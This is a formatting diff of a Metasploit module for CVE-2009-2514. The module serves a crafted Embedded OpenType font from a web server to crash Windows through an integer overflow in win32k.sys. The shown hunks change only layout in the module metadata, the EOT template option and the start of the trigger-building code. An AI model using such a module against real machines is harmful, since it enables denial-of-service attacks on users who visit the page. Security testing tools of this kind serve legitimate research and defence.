@@ -7,31 +7,32 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpServer::HTML
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Microsoft Windows EOT Font Table Directory Integer Overflow',
-      'Description'    => %q{
-        This module exploits an integer overflow flaw in the Microsoft Windows Embedded
-      OpenType font parsing code located in win32k.sys. Since the kernel itself parses
-      embedded web fonts, it is possible to trigger a BSoD from a normal web page when
-      viewed with Internet Explorer.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         => 'hdm',
-      'References'     =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Microsoft Windows EOT Font Table Directory Integer Overflow',
+        'Description' => %q{
+          This module exploits an integer overflow flaw in the Microsoft Windows Embedded
+          OpenType font parsing code located in win32k.sys. Since the kernel itself parses
+          embedded web fonts, it is possible to trigger a BSoD from a normal web page when
+          viewed with Internet Explorer.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => 'hdm',
+        'References' => [
           [ 'CVE', '2009-2514' ],
           [ 'MSB', 'MS09-065' ],
           [ 'OSVDB', '59869']
         ],
-      'Actions'        => [[ 'WebServer', 'Description' => 'Serve exploit via web server' ]],
-      'PassiveActions' => [ 'WebServer' ],
-      'DefaultAction'  => 'WebServer',
-      'DisclosureDate' => '2009-11-10'
-    ))
+        'Actions' => [[ 'WebServer', 'Description' => 'Serve exploit via web server' ]],
+        'PassiveActions' => [ 'WebServer' ],
+        'DefaultAction' => 'WebServer',
+        'DisclosureDate' => '2009-11-10'
+      )
+    )
     register_options([
       OptPath.new('EOTFILE', [ true, "The EOT template to use to generate the trigger", File.join(Msf::Config.data_directory, "exploits", "pricedown.eot")]),
     ])
-
   end
 
   def run
@@ -42,7 +43,7 @@ class MetasploitModule < Msf::Auxiliary
     @tag ||= Rex::Text.rand_text_alpha(8)
     @eot ||= ::File.read(datastore['EOTFILE'], ::File.size(datastore['EOTFILE']))
 
-    if(request.uri =~ /#{@tag}$/)
+    if (request.uri =~ /#{@tag}$/)
       content = @eot.dup
 
       # Only this table entry seems to trigger the bug
